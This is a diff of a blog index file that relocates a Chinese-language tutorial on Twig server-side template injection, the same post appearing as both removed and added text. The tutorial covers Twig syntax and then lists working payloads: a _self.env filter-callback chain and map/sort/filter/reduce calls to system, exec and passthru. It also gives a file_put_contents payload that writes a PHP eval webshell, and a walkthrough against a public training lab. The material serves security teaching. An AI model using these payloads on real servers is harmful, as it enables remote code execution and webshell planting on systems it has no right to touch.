     <content><![CDATA[<h1 id="模板注入之Freemaker"><a href="#模板注入之Freemaker" class="headerlink" title="模板注入之Freemaker"></a>模板注入之Freemaker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>FreeMarker 是一款 模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
 <p>模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， <em>不是</em> 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。</p>
@@ -3568,164 +3584,13 @@
 <p>[(60条消息) <a href="https://blog.csdn.net/caiqiiqi/article/details/104186575">CVE-2020-7799] Apache FreeMarker模板FusionAuth远程代码执行_公众号shadow sock7-CSDN博客</a></p>
 <p><a href="https://gitee.com/itdragon/springmvc">springmvc: 学习SpringMVC代码 (gitee.com)</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>模板注入之TWIG</title>
-    <url>/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/</url>
-    <content><![CDATA[<h1 id="模板注入之TWIG"><a href="#模板注入之TWIG" class="headerlink" title="模板注入之TWIG"></a>模板注入之TWIG</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Twig可能是PHP最流行的模板库，它是由Synfony（一个非常流行的PHP框架）的创建者开发的。在我们的练习中，我们还将用到Craft CMS，它是一个内部使用Twig的内容管理系统。</p>
-<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>注:安装环境PHP版本至少7.0</p>
-<p>直接使用composer命令安装指定版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer require &quot;twig/twig:^2.0&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul>
-<li><strong></strong>:说些什么.值的是输出一个变量值或者一个表达式的结果到模板。如：。</li>
-</ul>
-<p>变量绑定:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello  &#123;&#123; var &#125;&#125;</span><br><span class="line"></span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">twig也包含filters，它可以在模板渲染之前改变输出内容。如:&#123;&#123;表达式 | filters&#125;&#125;。</span><br><span class="line">注:这里还需要注意的是，当表达式中传值的时候，使用『:』,例如：&#123;&#123; path(‘board_reply’,&#123;id:item.id&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li><p><strong><a href title target></a></strong>:做些什么.控制模板逻辑的tag(标签),用于执行声明，如if、for循环语句等。</p>
-</li>
-<li><p><strong></strong>:进行注释.它相当于php的语法。它用于注释单行和多行。注释的内容不作为页面输出。</p>
-</li>
-</ul>
-<h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>相当于占位符，当被另一个模板继承时，可以调用这个模块。定义时的内容在继承的模板中默认是不会出现的，可以使用 {undefined{ parent() }} 来显示。块名称可以使用字母数字字符和下划线，不允许使用破折号(-)</p>
-<h3 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h3><p>不支持多重继承，只支持一个扩展模板</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html.twig&#x27; %&#125;</span><br><span class="line">&#123;% include %&#125;：包含模板</span><br><span class="line">&#123;% extends %&#125;：扩展模板</span><br><span class="line">&#123;% embed %&#125; xxx &#123;% endembed %&#125;：包含模板并扩展该模板的内容，相当于 include 和 extends 的结合体</span><br><span class="line">&#123;% macro %&#125; xxx &#123;% endmacro %&#125;：定义宏以便多次调用，与定义 PHP 函数无异</span><br><span class="line">&#123;% from aaa import bbb as ccc %&#125;：从指定模板导入宏并设置别名</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
-<li>如果在模板中使用extends,它必须是模板中的第一个标签</li>
-<li>如果在多个模板中有重复的内容,这可能意味着你需要为该内容在父模板中定义一个block</li>
-<li>某些情况下，更好的解决方案可能是把这些内容放到一个新模板中，然后在该模板中include它。</li>
-<li>如果你需要从父模板中获取一个block的内容，可以使用函数。如果你只是想在父级块上添加新内容，而不是完全覆盖它</li>
-<li>记住添加end符号</li>
-</ul>
-<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p><strong>判断变量是否定义(存在)</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is defined %&#125;</span><br><span class="line">&#123;%  a.name  %&#125;</span><br><span class="line">&#123;%  endif %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>判断变量是否为空</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is null %&#125;</span><br><span class="line">&#123;# do something #&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>多条件判断语法</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a %&#125;</span><br><span class="line">    &#123;&#123; a.name &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">        &lt;h1&gt;xxxxxxx&lt;/h1&gt;</span><br><span class="line">   &#123;% endid %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for a in list %&#125;</span><br><span class="line">           &lt;li&gt;&#123;&#123;a.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>按数组的key，value遍历，key&#x3D;index，value&#x3D;item</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for index, item in list %&#125;</span><br><span class="line">    &#123;&#123; index &#125;&#125;:&#123;&#123; item.id &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>按数组的key值遍历</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for key in list|keys %&#125;</span><br><span class="line">&#123;&#123; key &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><p>twig存在1.x，2.x，3.x的多个版本，不同版本的payload也有所不同。对于Twig来说，其变量_self暴露了Twig内部的许多API。</p>
-<h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><p><strong>getFilter函数中存在危险函数call_user_func</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getFilter(name)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    foreach (this-&gt;filterCallbacks as callback) &#123;</span><br><span class="line">    if (false !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">      return filter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback(callable)</span><br><span class="line">&#123;</span><br><span class="line">  this-&gt;filterCallbacks[] =callable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Twig-2-x-amp-amp-3-x"><a href="#Twig-2-x-amp-amp-3-x" class="headerlink" title="Twig 2.x&amp;&amp;3.x"></a>Twig 2.x&amp;&amp;3.x</h3><p>测试代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__.&#x27;/vendor/autoload.php&#x27;;</span><br><span class="line"></span><br><span class="line">loader = new \Twig\Loader\ArrayLoader();twig = new \Twig\Environment(loader);template = twig-&gt;createTemplate(&quot;Hello &#123;_GET[&#x27;name&#x27;]&#125;!&quot;);</span><br><span class="line"></span><br><span class="line">echo $template-&gt;render();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>命令执行成功，计算器打开</p>
-<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217143043214.png" class title="image-20220217143043214">
-
-
-
-<p><strong>使用map过滤器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用sort过滤器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用filter过滤器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用reduce过滤器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;calc&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a href="https://gosecure.github.io/template-injection-workshop/#0">http://template-injection.gosec.co:8012/.</a></p>
-<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145127665.png" class title="image-20220217145127665">
-
-
-
-<p>在这个表单中，您可以提交一个简单的表达式来确认模板是否用于显示值。下面的表达式将进行减法运算。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1338-1&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面减法运算的结果，应该显示为1337</p>
-<p>下面输入payload执行id命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>执行结果应该是:</p>
-<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145353259.png" class title="image-20220217145353259">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/">twig模板注入payload ~ M1saka’s blog</a></p>
-<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODcyNjEzNQ==&mid=2247518980&idx=4&sn=2fa791299de826677ad77e28c9e053ee&chksm=9bd3269caca4af8a9659666c8fc5a272f6f0de5927dbe305e25dacc104cc02b2154dfebf4ac9&scene=21#wechat_redirect">详解模板注入漏洞（上） (qq.com)</a></p>
-]]></content>
       <categories>
         <category>Web漏洞</category>
         <category>模板注入</category>
-        <category>注入漏洞</category>
+        <category>模板漏洞</category>
       </categories>
       <tags>
-        <tag>-Web漏洞 -模板注入</tag>
+        <tag>-Web漏洞 -模板注入 -freemaker</tag>
       </tags>
   </entry>
   <entry>
@@ -3915,6 +3780,165 @@
       </categories>
       <tags>
         <tag>-Web漏洞 -模板注入集合</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>模板注入之TWIG</title>
+    <url>/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/</url>
+    <content><![CDATA[<h1 id="模板注入之TWIG"><a href="#模板注入之TWIG" class="headerlink" title="模板注入之TWIG"></a>模板注入之TWIG</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Twig可能是PHP最流行的模板库，它是由Synfony（一个非常流行的PHP框架）的创建者开发的。在我们的练习中，我们还将用到Craft CMS，它是一个内部使用Twig的内容管理系统。</p>
+<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>注:安装环境PHP版本至少7.0</p>
+<p>直接使用composer命令安装指定版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer require &quot;twig/twig:^2.0&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul>
+<li><strong></strong>:说些什么.值的是输出一个变量值或者一个表达式的结果到模板。如：。</li>
+</ul>
+<p>变量绑定:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello  &#123;&#123; var &#125;&#125;</span><br><span class="line"></span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">twig也包含filters，它可以在模板渲染之前改变输出内容。如:&#123;&#123;表达式 | filters&#125;&#125;。</span><br><span class="line">注:这里还需要注意的是，当表达式中传值的时候，使用『:』,例如：&#123;&#123; path(‘board_reply’,&#123;id:item.id&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p><strong><a href title target></a></strong>:做些什么.控制模板逻辑的tag(标签),用于执行声明，如if、for循环语句等。</p>
+</li>
+<li><p><strong></strong>:进行注释.它相当于php的语法。它用于注释单行和多行。注释的内容不作为页面输出。</p>
+</li>
+</ul>
+<h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>相当于占位符，当被另一个模板继承时，可以调用这个模块。定义时的内容在继承的模板中默认是不会出现的，可以使用 {undefined{ parent() }} 来显示。块名称可以使用字母数字字符和下划线，不允许使用破折号(-)</p>
+<h3 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h3><p>不支持多重继承，只支持一个扩展模板</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html.twig&#x27; %&#125;</span><br><span class="line">&#123;% include %&#125;：包含模板</span><br><span class="line">&#123;% extends %&#125;：扩展模板</span><br><span class="line">&#123;% embed %&#125; xxx &#123;% endembed %&#125;：包含模板并扩展该模板的内容，相当于 include 和 extends 的结合体</span><br><span class="line">&#123;% macro %&#125; xxx &#123;% endmacro %&#125;：定义宏以便多次调用，与定义 PHP 函数无异</span><br><span class="line">&#123;% from aaa import bbb as ccc %&#125;：从指定模板导入宏并设置别名</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
+<li>如果在模板中使用extends,它必须是模板中的第一个标签</li>
+<li>如果在多个模板中有重复的内容,这可能意味着你需要为该内容在父模板中定义一个block</li>
+<li>某些情况下，更好的解决方案可能是把这些内容放到一个新模板中，然后在该模板中include它。</li>
+<li>如果你需要从父模板中获取一个block的内容，可以使用函数。如果你只是想在父级块上添加新内容，而不是完全覆盖它</li>
+<li>记住添加end符号</li>
+</ul>
+<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p><strong>判断变量是否定义(存在)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is defined %&#125;</span><br><span class="line">&#123;%  a.name  %&#125;</span><br><span class="line">&#123;%  endif %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>判断变量是否为空</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is null %&#125;</span><br><span class="line">&#123;# do something #&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>多条件判断语法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a %&#125;</span><br><span class="line">    &#123;&#123; a.name &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">        &lt;h1&gt;xxxxxxx&lt;/h1&gt;</span><br><span class="line">   &#123;% endid %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for a in list %&#125;</span><br><span class="line">           &lt;li&gt;&#123;&#123;a.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>按数组的key，value遍历，key&#x3D;index，value&#x3D;item</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for index, item in list %&#125;</span><br><span class="line">    &#123;&#123; index &#125;&#125;:&#123;&#123; item.id &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>按数组的key值遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for key in list|keys %&#125;</span><br><span class="line">&#123;&#123; key &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><p>twig存在1.x，2.x，3.x的多个版本，不同版本的payload也有所不同。对于Twig来说，其变量_self暴露了Twig内部的许多API。</p>
+<h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><p><strong>getFilter函数中存在危险函数call_user_func</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getFilter(name)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    foreach (this-&gt;filterCallbacks as callback) &#123;</span><br><span class="line">    if (false !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">      return filter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback(callable)</span><br><span class="line">&#123;</span><br><span class="line">  this-&gt;filterCallbacks[] =callable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Twig-2-x-amp-amp-3-x"><a href="#Twig-2-x-amp-amp-3-x" class="headerlink" title="Twig 2.x&amp;&amp;3.x"></a>Twig 2.x&amp;&amp;3.x</h3><p>测试代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__.&#x27;/vendor/autoload.php&#x27;;</span><br><span class="line"></span><br><span class="line">loader = new \Twig\Loader\ArrayLoader();twig = new \Twig\Environment(loader);template = twig-&gt;createTemplate(&quot;Hello &#123;_GET[&#x27;name&#x27;]&#125;!&quot;);</span><br><span class="line"></span><br><span class="line">echo $template-&gt;render();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>命令执行成功，计算器打开</p>
+<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217143043214.png" class title="image-20220217143043214">
+
+
+
+<p><strong>使用map过滤器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用sort过滤器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用filter过滤器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用reduce过滤器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;calc&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a href="https://gosecure.github.io/template-injection-workshop/#0">http://template-injection.gosec.co:8012/.</a></p>
+<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145127665.png" class title="image-20220217145127665">
+
+
+
+<p>在这个表单中，您可以提交一个简单的表达式来确认模板是否用于显示值。下面的表达式将进行减法运算。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1338-1&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面减法运算的结果，应该显示为1337</p>
+<p>下面输入payload执行id命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行结果应该是:</p>
+<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145353259.png" class title="image-20220217145353259">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/">twig模板注入payload ~ M1saka’s blog</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODcyNjEzNQ==&mid=2247518980&idx=4&sn=2fa791299de826677ad77e28c9e053ee&chksm=9bd3269caca4af8a9659666c8fc5a272f6f0de5927dbe305e25dacc104cc02b2154dfebf4ac9&scene=21#wechat_redirect">详解模板注入漏洞（上） (qq.com)</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>模板注入</category>
+        <category>注入漏洞</category>
+      </categories>
+      <tags>
+        <tag>-Web漏洞 -模板注入 -TWIG</tag>
       </tags>
   </entry>
   <entry>
